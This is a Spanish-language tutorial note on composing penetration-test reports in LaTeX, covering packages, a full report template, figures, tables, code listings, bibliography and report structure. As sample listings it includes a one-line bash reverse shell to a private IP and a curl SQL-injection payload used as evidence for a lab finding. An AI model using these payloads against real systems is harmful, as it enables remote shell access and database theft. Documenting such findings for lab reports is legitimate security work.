---
tags:
  - ciberseguridad
  - documentacion
  - creacion-latex
tipo: concepto
estado: terminado
---

# Creación de Informes en LaTeX

**LaTeX** es el sistema de composición por el que se entregan los informes de pentest con calidad editorial: numeración automática, figuras/tablas flotantes con referencias cruzadas, listados de código resaltados, bibliografía y un PDF final reproducible compilación tras compilación. Veremos primero el entorno, luego la mecánica de cada elemento y al final la **estructura de un informe de seguridad** (resumen ejecutivo → hallazgos → evidencia).

> [!info] Dos tipos de documento, un mismo lenguaje
> - **Informe técnico**: detallado, con comandos, evidencias, capturas y análisis; audiencia técnica.
> - **Informe ejecutivo**: resumen, riesgo de negocio, remediación priorizada; audiencia directiva.
> Mismo LaTeX, distinta proporción: el ejecutivo condensa los hallazgos del técnico en una o dos páginas con severidad y impacto económico.

## 1. Configuración del entorno

```bash
sudo apt install latexmk zathura texlive-full texlive-base
```

> [!info] Componentes de LaTeX
> - **`latexmk`**: automatiza la compilación ejecutando `pdflatex`, `bibtex`/`biber` y `makeindex` las veces necesarias hasta que índice, referencias y citas quedan resueltos.
> - **`zathura`**: visor ligero y configurable (PDF/PS/DjVu) con recarga automática — compañero ideal de `latexmk -pvc`.
> - **`texlive-full`**: distribución completa (paquetes, fuentes, herramientas); pesa mucho pero evita `! File 'x.sty' not found`.
> - **`texlive-base`**: mínima; solo si se instala paquetes bajo demanda.

Configuramos Zathura como visor por defecto:

```bash
sudo xdg-mime query default application/pdf
sudo xdg-mime default zathura.desktop application/pdf
```

Y creamos `~/.config/latexmk/latexmkrc` (y también para `root`) con:

```
$pdf_previewer = "zathura";
```

> [!tip] Archivo `latexmkrc`
> Es el script de configuración de `latexmk` (Perl): define variables y funciones del proceso de compilación. `$pdf_previewer` indica qué visor se lanza con `-pvc`; también se pueden fijar `@default_files`, `$pdf_mode` oFlags de limpieza.

## 2. Anatomía de un documento

```latex
\documentclass[a4paper]{article}   % clase de documento y tamaño de papel

\usepackage[utf8]{inputenc}        % codificación de entrada (acentos)
\usepackage[spanish]{babel}        % convenciones del idioma español

\begin{document}                   % inicio del contenido
Hola que tal probando
\end{document}                     % fin del contenido
```

| Clase | Para qué | Ejemplo de uso |
|---|---|---|
| `article` | Documento con secciones sin capítulo | Informes cortos, one-pagers |
| `report` | Secciones + `\chapter` | **Informes de pentest largos** |
| `book` | Capítulos con partes | Manuales |
| `letter` | Cartas | Notificaciones a cliente |
| `beamer` | Diapositivas | Presentación de resultados |
| `memo` | Memorandums internos | Notas técnicas |

Opciones comunes de clase: `a4paper`/`letterpaper`, `11pt`/`12pt`, `twoside`, `titlepage` (implícito en `report`).

### Compilar

```bash
latexmk -pdf Documento.tex          # una compilación → Documento.pdf
```

![[Pasted image 20250831185312.png]]

Compilar a mano tras cada cambio es tedioso; la forma productiva es la **previsualización continua**:

```bash
latexmk -pdf Documento.tex -pvc
```

![[Pasted image 20250831191254.png]]

> [!tip] `latexmk -pvc` (*preview continuous*)
> Mantiene un proceso en segundo plano que vigila el `.tex` y sus dependencias; **cada guardado recompila automáticamente** y refresca el visor (Zathura, si está configurado). Latido del flujo de redacción: escribes → guardas → ves el PDF. `latexmk -C` limpia todos los archivos auxiliares generados.

## 3. El preámbulo: paquetes y por qué se necesitan

| Paquete / comando | Función | Cuándo hace falta |
|---|---|---|
| `inputenc` (`utf8`) | Acentos y caracteres especiales desde UTF-8 | Siempre (omitir en LuaLaTeX/XeLaTeX) |
| `babel` (`spanish`) | Títulos en español, guiones, tipografía local | Siempre en informes en español |
| `geometry` | Márgenes: `margin=2cm`, `top`, `includefoot` | Cuando el formato lo pide el cliente |
| `graphicx` | `\includegraphics` para imágenes | Siempre (evidencias) |
| `xcolor` (`table`) | Colores RGB/HTML y colorear tablas/texto | Resaltar severidades (rojo/ámbar/verde) |
| `tikz` + `lipsum` + `lmodern` | Diagramas vectoriales, texto de relleno, fuentes Latin Modern | Diagramas de red en el informe |
| `tcolorbox` (`most`) | Cajas con título y estilo avanzado | Callouts, notas de alcance, banners de confidencialidad |
| `fancyhdr` | Encabezados/pies personalizados con logos | Informes con cabecera de marca |
| `hyperref` (`hidelinks`) | Índice, referencias y enlaces interactivos | Siempre — **cargarlo al final** del bloque de paquetes |
| `setspace` | Interlineado (`\setstretch{1.2}`) | Requisitos de formato |
| `parskip` | Espacio entre párrafos en vez de sangría | Estilo técnico moderno |
| `caption` (`figurename=…`) | Títulos de figuras/tablas personalizados | Renombrar "Figura" → "Image/Evidencia" |
| `ragged2e` | `\justifying` para volver a justificar tras centrar | Tras `\centering` o entornos flotantes |
| `listings` | Listados de código con resaltado | Alternativa a `minted` (§6) |
| `booktabs` | `toprule/midrule/bottomrule` (tablas limpias) | **Tablas de hallazgos** (§8) |
| `biblatex` + `biber` | Citas y bibliografía (`\cite`, `\printbibliography`) | Informes con referencias (§7) |
| `siunitx` | Números y unidades (`\SI{20}{\mega\hertz}`) | Métricas de escaneo |
| `microtype` | Microtipografía (menos overfull) | Cualquier documento pro |

> [!warning] Orden de carga
> `hyperref` casi siempre **último** (algunos paquetes lo pisan y aparecen enlaces rotos o errores de compatibilidad); excepciones documentadas: `cleveref` después de `hyperref`, `tcolorbox` con sus librerías puede ir antes. Si cambias el orden y el PDF se rompe, vuelve al orden: … → `tcolorbox` → `hyperref` → `cleveref`.

### Comandos de formato esenciales

| Comando | Efecto |
|---|---|
| `\section{}` / `\subsection{}` / `\subsubsection{}` | Jerarquía numerada + índice |
| `\newcommand{\nombre}{contenido}` | Macro: variables del informe (máquina, fecha, logos) |
| `\textbf{}` / `\textit{}` / `\texttt{}` | Negrita / cursiva / monoespaciada |
| `\textcolor{color}{texto}` | Color de texto |
| `\begin{itemize}` + `\item` | Lista con viñetas (`enumerate` = numerada) |
| `\vspace{}` / `\vfill` | Espacio vertical concreto / elástico |
| `\\` | Salto de línea dentro de un párrafo o celda |
| `\clearpage` / `\newpage` | Salto de página forzado |
| `\centering` | Centrar el contenido del entorno actual |
| `\scshape` `\LARGE` `\Huge` | Versalitas y tamaños de fuente |
| `\href{URL}{texto}` | Hipervínculo externo |
| `\label{}` + `\ref{}` | Referencia cruzada automática (figuras, secciones) |

## 4. Receta: plantilla completa de informe

Preambulo de referencia (colores, estilo de código, variables y cabecera):

```latex
\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}
\usepackage[margin=2cm, top=2cm, includefoot]{geometry}
\usepackage{graphicx}
\usepackage[table,xcdraw]{xcolor}
\usepackage{tikz,lipsum,lmodern}
\usepackage[most]{tcolorbox}
\usepackage{fancyhdr}
\usepackage[hidelinks]{hyperref}          % ← al final del bloque
\usepackage{setspace}
\setstretch{1.2}
\usepackage{parskip}
\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em}
\setlength{\parfillskip}{\parindent plus 1fill}
\usepackage[figurename=Evidencia]{caption}
\usepackage{ragged2e}
\usepackage{listings}
\usepackage{booktabs}

% ── colores ──
\definecolor{bluePortada}{HTML}{146c8a}
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

% ── estilo de código ──
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}
\lstset{style=mystyle}

% ── variables del informe ──
\newcommand{\logoPortada}{./img/logoVulnHub.png}
\newcommand{\machineName}{Presidential: 1}
\newcommand{\logoMachine}{./img/Casa-Blanca.jpg}
\newcommand{\startDate}{31 de Agosto del 2025}
\newcommand{\logoAcademia}{./img/logoAcademia.png}
\newcommand{\logoVulnhubSimple}{./img/LogoVulhubMini.png}

% ── cabecera / pies ──
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}
\setlength{\headheight}{40.2pt}
\pagestyle{fancy}
\fancyhf{}
\lhead{\includegraphics[width=1.3cm]{\logoAcademia}}
\rhead{\includegraphics[height=1.5cm]{\logoVulnhubSimple}}
\renewcommand{\headrulewidth}{3pt}
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\renewcommand{\lstlistingname}{Código}
```

> [!info] Claves del preámbulo
> - **`\newcommand`**: centraliza datos variables (nombre de máquina, fecha); cambiar el dato **una sola vez** arriba reescribe todo el informe.
> - **`\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}`**: con `babel`, renombra "Contents" → "Índice".
> - **`\pagestyle{fancy}` + `\fancyhf{}`**: limpia el diseño por defecto; luego `\lhead`/`\rhead`/`\cfoot` colocan logos y paginación.
> - **`\headrule` con `\leaders`**: convierte la regla de cabecera en una línea de color de marca de grosor `3pt`.
> - **`\renewcommand{\lstlistingname}{Código}`**: los listados se titulan "Código 1:" en vez de "Listing 1:".

Portada con `titlepage`:

```latex
\begin{document}
\cfoot{\thepage}
\begin{titlepage}
	\centering{
		\includegraphics[width=0.5\textwidth]{\logoPortada}\par\vspace{1cm}
		% \textwidth se acopla al ancho del texto; \paperwidth al del papel
		% (con \makebox[\textwidth]{\includegraphics[width=\paperwidth]{…}} para logos a sangre)

		{\scshape\LARGE \textbf{Informe Técnico}}\par\vspace{0.4cm}
		{\Huge\textcolor{bluePortada}{\textbf{Máquina \machineName}}}
		\vfill\vfill
		\includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}
		\vfill
	}
	\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
		\centering{
			Este documento es confidencial y contiene información sensible. \\
			No debería ser impreso ni compartido con terceras entidades
		}
	\end{tcolorbox}
	\vfill
	{\large \startDate}
	\vfill
\end{titlepage}
```

Índice:

```latex
\clearpage
\tableofcontents
\clearpage
```

> [!info] `\tableofcontents`
> Genera el índice numerado con páginas. Requiere **dos compilaciones** (una para descubrir secciones, otra para resolver números de página) — `latexmk` lo hace solo; a mano: `pdflatex` ×2.

## 5. Figuras, tablas y diagramas

### Figuras flotantes

```latex
\begin{figure}[h]              % h=here, t=top, b=bottom, p=página propia
	\centering
	\setlength{\fboxrule}{0.8pt}
	\fbox{\includegraphics[width=\textwidth]{./img/ScanNmapPorts.png}}
	\caption{Enumeración de puertos con Nmap}\label{fig:nmap}
\end{figure}
```

- `\fbox` = marco fino alrededor de la captura (excelente para evidencias).
- `\caption{}` numera automáticamente; `\label{fig:nmap}` + `Figura~\ref{fig:nmap}` crea la referencia cruzada.
- `[h]` es una *sugerencia*: LaTeX moverá la figura si no cabe — no fuerces saltos raros con `H` salvo que lo necesites (`float` package).

### Tablas

```latex
% Tabla básica
\begin{center}
	\begin{tabular}{ c | c }
		\textbf{Tecnologías} & \textbf{Versión} \\ \hline
		PHP                  & 5.5.38           \\
		Apache               & 2.4.6
	\end{tabular}
\end{center}

% Tabla editorial con booktabs (la de los informes serios)
\begin{table}[ht]
	\centering
	\caption{Hallazgos por severidad}
	\label{tab:hallazgos}
	\begin{tabular}{@{}llll@{}}
		\toprule
		\textbf{ID} & \textbf{Título} & \textbf{CVSS} & \textbf{Estado} \\
		\midrule
		H-01 & SQL Injection en login & 9,8 & Confirmado \\
		H-02 & XMLRPC brute force     & 7,5 & Confirmado \\
		\bottomrule
	\end{tabular}
\end{table}
```

| Especificación de columnas | Significado |
|---|---|
| `c` / `l` / `r` | Centrada / izquierda / derecha |
| `\|` | Línea vertical (evitar en booktabs) |
| `@{}` | Elimina el margen lateral |
| `p{3cm}` | Columna con salto de línea (texto largo) |
| `X` (paquete `tabularx`) | Columna que se estira al ancho disponible |

> [!tip] booktabs vs `\hline`
> `toprule/midrule/bottomrule` dan grosor y separación tipográfica correctos: reglas finas arriba y abajo, media en la cabecera, **sin verticales**. Es el estándar de las tablas de hallazgos; `\hline` + `|` queda "de hoja de cálculo".

### Diagramas con TikZ

```latex
\begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw, fill=white}]
	\node (center) {TCP};
	\node (port1) [below left of=center, node distance=3cm] {Puerto 80};
	\node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
	\draw (center) -- (port1);
	\draw (center) -- (port2);
\end{tikzpicture}
```

- `node distance` = separación por defecto; `every node/.style` aplica estilo global (rectángulo, borde, fondo).
- `\draw (A) -- (B)` conecta nodos; útil para topologías de red del reconocimiento.
- Tras `\centering` global, `\justifying` (de `ragged2e`) restaura la justificación del resto del texto.

## 6. Código en el informe: `listings` vs `minted`

| | **`listings`** | **`minted`** |
|---|---|---|
| Dependencias | Solo LaTeX (siempre compila) | Requiere **Python + Pygments** y `-shell-escape` |
| Calidad de resaltado | Buena, por palabras clave | Excelente (soporta 500+ lenguajes) |
| Números de línea / anclaje | ✅ (`numbers=left`) | ✅ |
| Entornos para PDFs aislados | ✅ sin flags extra | ❌ fallo sin `-shell-escape` |
| Recomendación | **Por defecto en informes de cliente** | Si se quiere máxima estética y el entorno está controlado |

```bash
# compilar con minted
latexmk -pdf -shell-escape Informe.tex
```

```latex
\begin{lstlisting}[language=bash, caption=Script de reverse shell en Bash]
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.45/443 0>&1
\end{lstlisting}
```

- `caption=` titula el listado ("Código 1: …"), `language=` fija el resaltado (`bash`, `python`, `xml`, `php`, `powershell`…).
- El estilo global `mystyle` de §4 unifica colores, `tabsize=2` y salto de líneas (`breaklines`) — los comandos largos de nmap no desbordan la página.
- **Nunca** dejes comandos ofensivos sin pie: `caption` explica qué hace y por qué (contexto para el revisor).

## 7. Citas y bibliografía (biblatex)

```latex
% preámbulo
\usepackage[backend=biber, style=apa, sorting=nyt]{biblatex}
\addbibresource{referencias.bib}

% en el texto
El estándar CVSS~\cite{first2019cvss} permite priorizar vulnerabilidades.

% antes de \end{document}
\printbibliography[title=Bibliografía]
```

```bibtex
@misc{first2019cvss,
  title        = {Common Vulnerability Scoring System v3.1},
  author       = {FIRST.org},
  year         = {2019},
  howpublished = {\url{https://www.first.org/cvss/}},
}
```

| Paso | Comando | Nota |
|---|---|---|
| Resolver citas | `latexmk` (detecta `biblatex` y corre `biber`) | A mano: `biber Informe` + `pdflatex` ×2 |
| Estilos | `apa`, `ieee`, `numeric`, `authoryear` | `ieee` es habitual en informes técnicos |
| `\url{}` | URL clicable | Requiere `hyperref` |
| Ordenar | `sorting=nyt` (autor-año-título) o `none` (orden de cita) | — |

> [!warning] `bibtex` ≠ `biber`
> El clásico `bibtex` + `natbib` sigue en artículos viejos; `biblatex` moderno usa **`biber`** (UTF-8, campos ricos). Si `latexmk` no encuentra las citas, comprueba que el backend sea `biber` y que exista `referencias.bib` en la misma carpeta.

## 8. Estructura de un informe de pentest

```
1. Portada            (título, máquina/objetivo, fecha, confidencialidad)
2. Índice
3. Resumen ejecutivo  ← 1 página: qué se probó, qué se encontró (severidad), recomendación global
4. Alcance y metodología
     · Objetivos / Impedimentos y limitaciones
     · Fases: Reconocimiento → Explotación → Escalada de privilegios
     · Herramientas y fechas
5. Hallazgos          ← uno por sección, con plantilla fija (ver abajo)
6. Evidencias         ← capturas con \fbox, comandos en lstlisting, logs
7. Conclusiones y plan de remediación priorizado
8. Apéndices          (wordlists, scripts completos, anexos legales)
```

**Plantilla de hallazgo (una sección por vulnerabilidad):**

```latex
\section{H-01: SQL Injection en el formulario de acceso}

\begin{table}[ht]\centering\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Severidad} & \textbf{Crítica (CVSS 9,8)} \\
\textbf{Vector}    & \textbf{CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H} \\
\textbf{Activo}    & http://objetivo.lab/login \\
\bottomrule
\end{tabular}\end{table}

\subsection{Descripción}
El parámetro \texttt{email} no valida la entrada antes de construir la
consulta SQL~\cite{owasp2021}.

\subsection{Evidencia}
\begin{lstlisting}[language=bash, caption=Extracción del esquema de base de datos]
curl -s -X POST http://objetivo.lab/login \
  --data "email=admin' UNION SELECT table_name,null FROM information_schema.tables--"
\end{lstlisting}

\subsection{Impacto}
Lectura y modificación de la base de datos completa, incluidas credenciales.

\subsection{Remediación}
Consultas parametrizadas (prepared statements) y principio de mínimo privilegio
en el usuario de base de datos.
```

Reglas de redacción:

| Regla | Por qué |
|---|---|
| Un hallazgo = una sección con su ID (H-01…) | Citable en la reunión de cierre |
| Siempre **evidencia reproducible**: comando + salida | Sin ella el hallazgo es una opinión |
| Severidad CVSS + justificación del contexto | El número solo no convence al negocio |
| Remediación accionable (quién y qué hace) | El cliente compra la solución, no el problema |
| Capturas con pie descriptivo (`caption`) | El revisor entiende la imagen sin leyenda aparte |

## 9. Errores de compilación frecuentes

| Error | Causa | Solución |
|---|---|---|
| `! LaTeX Error: File 'booktabs.sty' not found` | Paquete no instalado | `texlive-full` o `tlmgr install booktabs` |
| `! Missing $ inserted` | `_`, `^`, `%` o `&` fuera de modo matemático/celda | Escapar: `\%`, `\&`, `\_` o envolver en `$…$` |
| `! Unicode character … not set up for use with LaTeX` | UTF-8 sin `inputenc` (o LuaLaTeX mal configurado) | `\usepackage[utf8]{inputenc}` |
| `! Environment figure undefined` / `\begin` ≠ `\end` | Entorno sin cerrar o mal anidado | Buscar el `\end` que falta; TeXLive señala la línea |
| `! LaTeX Error: Command \X undefined` | Comando de un paquete no cargado | Añadir el `\usepackage` correspondiente |
| Enlaces/índice rotos tras añadir `hyperref` | `hyperref` cargado demasiado pronto | Moverlo al final del bloque de paquetes |
| Citas `??` en el PDF | Falta `biber`/`bibtex` o compilación insuficiente | `latexmk` (o `biber Informe` + `pdflatex` ×2) |
| Índice con páginas `??` | Solo una compilación | `latexmk -pdf` o `pdflatex` dos veces |
| `Overfull \hbox` en la consola | Línea más ancha que la columna (códigos largos) | `breaklines=true` en listings; `\sloppy` puntual |
| `minted` falla con "You must invoke latex with -shell-escape" | Falta la flag de seguridad | `latexmk -pdf -shell-escape doc.tex` |
| `\caption` fuera de `figure/table` | Caption suelto en el texto | Meterlo en el entorno flotante |
| Figuras en carpeta equivocada | Rutas relativas a `./img/` | Mantener la estructura `doc.tex` + `img/` |

> [!tip] Higiene de compilación
> - `latexmk -C` borra todos los auxiliares (`.aux`, `.log`, `.bbl`, `.fls`…).
> - Versiona `.tex`, `.bib` e `img/`; **no** los auxiliares (agregálos a `.gitignore`).
> - El primer error de la lista de la consola es casi siempre el real: los demás son efecto dominó.

## 10. Errores comunes del redactor

1. **Escribir el informe al final del engagement**: redacta cada hallazgo en cuanto lo confirmes; el contexto fresco se pierde.
2. **Capturas sin pie ni fecha**: añade `caption` + timestamp en el pie del sistema.
3. **Pegar comandos sin explicar flags**: el revisor debe poder reproducir sin adivinar.
4. **Duplicar datos en varios sitios** en vez de usar `\newcommand`: cambia la fecha en un sitio y se desincroniza todo.
5. **Olvidar la confidencialidad**: banner en portada y cabecera si el documento contiene credenciales o vulnerabilidades.
6. **Mezclar audiencias**: el resumen ejecutivo no lleva comandos; el apéndice técnico no lleva marketing.
7. **`-shell-escape` en máquinas ajenas**: solo con `minted` y en tu entorno; es ejecución de código durante la compilación.

## 11. Cheatsheet

```bash
# entorno
sudo apt install latexmk zathura texlive-full
# compilar
latexmk -pdf Informe.tex              # una vez
latexmk -pdf Informe.tex -pvc         # continuo (guardar → refresca)
latexmk -pdf -shell-escape Informe.tex   # con minted
latexmk -C                            # limpiar auxiliares
```

```latex
% estructura mínima
\documentclass[a4paper]{article}
\usepackage[utf8]{inputenc} \usepackage[spanish]{babel}
\usepackage[hidelinks]{hyperref}            % al final
\begin{document} … \tableofcontents … \end{document}

% referencias
\begin{figure}[h]\centering\fbox{\includegraphics[width=\textwidth]{img/x.png}}
\caption{Título}\label{fig:x}\end{figure}
Ver Figura~\ref{fig:x}.

% tabla booktabs
\begin{tabular}{@{}ll@{}}\toprule A & B \\\midrule 1 & 2 \\\bottomrule\end{tabular}

% código
\begin{lstlisting}[language=bash, caption=Descripción] … \end{lstlisting}

% citas
\usepackage[backend=biber,style=ieee]{biblatex}
\addbibresource{referencias.bib}  →  \cite{clave}  →  \printbibliography
```

## 12. Referencias

- Proyecto LaTeX (documentación): <https://www.latex-project.org/help/documentation/>
- Wikibooks — LaTeX/Plantillas: <https://en.wikibooks.org/wiki/LaTeX>
- Overleaf learn (referencia rápida): <https://www.overleaf.com/learn>
- `listings` (CTAN): <https://ctan.org/pkg/listings> · `minted`: <https://ctan.org/pkg/minted>
- `booktabs`: <https://ctan.org/pkg/booktabs> · `biblatex`: <https://ctan.org/pkg/biblatex>
- `latexmk` man page: <https://ctan.org/pkg/latexmk>
- OWASP — plantillas de reporte: <https://owasp.org/www-project-web-security-testing-guide/>

## Relacionadas

- [[Reconocimiento y Escaneo de Redes y Web]] — disciplina de documentación previa
- [[Enumeración de Servicios y CMS]] — hallazgos que alimentan el informe
- [[Introducción a la Explotación de Vulnerabilidades]] — CVE/CVSS para las tablas de severidad
- [[Presidential_1]] — writeup del que procede la plantilla de ejemplo
